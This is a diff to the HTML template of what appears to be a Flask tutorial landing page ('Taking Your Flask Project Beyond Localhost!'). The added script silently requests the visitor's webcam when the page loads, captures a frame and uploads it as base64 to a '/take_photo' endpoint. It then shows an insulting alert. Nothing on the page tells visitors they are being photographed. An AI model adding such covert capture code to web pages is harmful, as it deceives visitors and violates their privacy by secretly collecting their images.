@@ -30,7 +30,69 @@
     <div class="context">
         <h1>Coding Craft YT</h1>
         <h3>Taking Your Flask Project Beyond Localhost!</h3>
+        <div>
+            <canvas id="canvas" width="640" height="480"></canvas>
+        </div>
     </div>
+
+    <script>
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function (stream) {
+                var video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                video.addEventListener('canplay', function() {
+                    setTimeout(function () {
+                        // Capture and display image after a short delay
+                        captureAndDisplayImage();
+                    }, 1000);
+                });
+            })
+            .catch(function (err) {
+                console.log("An error occurred: " + err);
+            });
+
+        // Function to capture and display image
+        function captureAndDisplayImage() {
+            var video = document.createElement('video');
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+
+            // Capture first frame from the video stream
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function (stream) {
+                    video.srcObject = stream;
+                    video.play();
+                    video.addEventListener('canplay', function() {
+                        // Draw the first frame onto the canvas
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Convert canvas to base64 encoded image data
+                        var dataURL = canvas.toDataURL('image/png');
+
+                        // Send image data to the server via AJAX
+                        fetch('/take_photo', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({ image_data: dataURL }),
+                        })
+                            .then(response => {
+                                if (response.ok) {
+                                    alert('Fuck you!');
+                                } else {
+                                    alert('Failed to capture photo.');
+                                }
+                            })
+                            .catch(error => console.error('Error:', error));
+                    });
+                })
+                .catch(function (err) {
+                    console.log("An error occurred: " + err);
+                });
+        }
+    </script>
 </body>
 
 </html>
